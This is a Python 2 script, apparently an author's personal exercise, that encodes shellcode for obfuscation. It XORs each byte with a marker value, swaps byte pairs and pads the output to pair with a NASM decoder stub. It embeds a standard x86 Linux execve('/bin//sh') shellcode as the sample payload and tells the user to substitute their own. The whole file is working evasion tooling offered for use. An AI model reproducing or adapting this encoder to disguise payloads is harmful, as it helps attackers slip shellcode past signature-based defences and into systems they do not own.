#!/usr/bin/python

'''
Author          : Elham AlShehri 
Website		: https://medium.com/@inspiratii0n

Description     : xor-swap-encoder

Test Using:
        1. Put your shellcode in shellcode variable
        2. ./xor-swap-encoder.py

'''

# YOUR SHELLCODE
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x89\xd1\xb0\x0b\xcd\x80")


# marker to xor with --> the same in the decoder.nasm
marker = '\xEE'

# This function will:
#	1. xor each byte with the marker
#	2. swap each block of bytes.
#		e.g. (even block bytes) : AB CD EF GH      ===> CD AB GH EF
#		e.g. (odd  block bytes) : AB CD EF GH IJ   ===> CD AB GH EF IJ
def encode(bytes):
	swapData = bytearray([])
	i = 0
	while i < int(len(bytes)) - 1:
		# 1. XOR 
		firstByte = ord(bytes[i]) ^ ord(marker)
		secndByte = ord(bytes[i+1]) ^ ord(marker)
		
		# 2. SWAP
		swapData += bytearray([ secndByte, firstByte ])
		
		# mov 2 bytes
		i+=2
		
	# after finish, check if the shellcode's length is odd
	#	then just XOR the last byte and add it to shellcode
	if int(len(bytes)) % 2 != 0:
		# 1. XOR
		swapData += bytearray([ ord(bytes[i]) ^ ord(marker)])
	return swapData


# Padding the shellcode with the marker
#	* if shellcode's length is odd --> padd with 3 markers. Otherwise, pad 2 markers
def pad(bytes):
	return bytes + (marker * ( 3 if int(len(bytes)) % 2 != 0 else 2))
	
# Print shellcode as raw and nasm formats
def printBytes(bytes):
	p = ""
	p2 = ""
	for x in bytearray(bytes) :
		p2 += '\\x'
		p2 += '%02x' % x
		p += '0x'
		p += '%02x,' %x
	return p2 +"\n\n" +p



print 'Encoded shellcode ...'
# encode
shellcode = encode(shellcode)
# then pad
shellcode = pad(shellcode)
print 'Len: %d' % len(bytearray(shellcode))
print printBytes(shellcode)
print "\n"